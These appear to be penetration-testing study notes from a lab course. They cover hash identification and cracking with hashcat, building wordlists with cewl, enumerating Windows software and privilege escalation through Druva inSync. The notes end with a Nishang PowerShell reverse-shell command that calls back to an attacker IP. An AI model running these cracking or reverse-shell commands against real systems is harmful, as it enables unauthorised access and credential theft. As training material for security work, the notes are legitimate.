Find the type of hash with hashid (-m means output the hashcat type)

```
#-m for hashcat output
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
#-p for John the ripper output
hashid -j '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
```

Use a wordlist to crack the password
```
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 rockyou.txt
#Print the results
cat ~/.local/share/hashcat/hashcat.potfile
#Or add --show to print results directly
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 --show rocky
ou.txt
```

Use a wordlist and augment the list using a rule
```
hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

If the passwordt format is known (what kind and amount of letters) we can use a mask attack
```
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```

#Creating custom wordlists by scraping a site
```
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

See output generated before cracking
```
hashcat -a 1 --stdout wordlist_mark.txt wordlist.mark 
```

## Vulnerable services

We can enumerate installed applications with:
```
wmic product get name
```

In the example given we find an appliation running as `SYSTEM` which has a known privilege escalation exploit: `Druva inSync 6.6.3`.

We can use this script (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1- to exploit the vulnerability. In the example a user is added but we could change the command to a reverse shell if we want:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```




